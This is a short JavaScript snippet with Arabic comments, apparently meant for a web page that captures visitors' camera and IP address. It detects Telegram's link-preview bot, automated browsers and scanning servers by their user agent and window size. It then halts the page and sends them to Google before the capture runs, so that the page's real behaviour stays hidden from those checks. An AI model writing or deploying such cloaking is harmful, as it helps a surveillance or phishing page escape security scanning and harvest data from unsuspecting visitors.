/* Ahmed's Ultimate Shield v4
   هذا الكود يقتل البوتات بناءً على أبعاد الشاشة التي تظهر في سجلاتك (800x600)
*/

(function() {
    // 1. القائمة السوداء للأجهزة الوهمية (تليجرام وسيرفرات الفحص)
    const isBot = (
        navigator.webdriver || 
        navigator.userAgent.includes("TelegramBot") ||
        (window.innerWidth === 800 && window.innerHeight === 600) || // طرد البوت الظاهر في صورتك
        (window.innerWidth === 0)
    );

    if (isBot) {
        // إيقاف المتصفح فوراً قبل سحب الكاميرا أو الأيبي
        window.stop();
        window.location.replace("https://www.google.com");
    }
})();
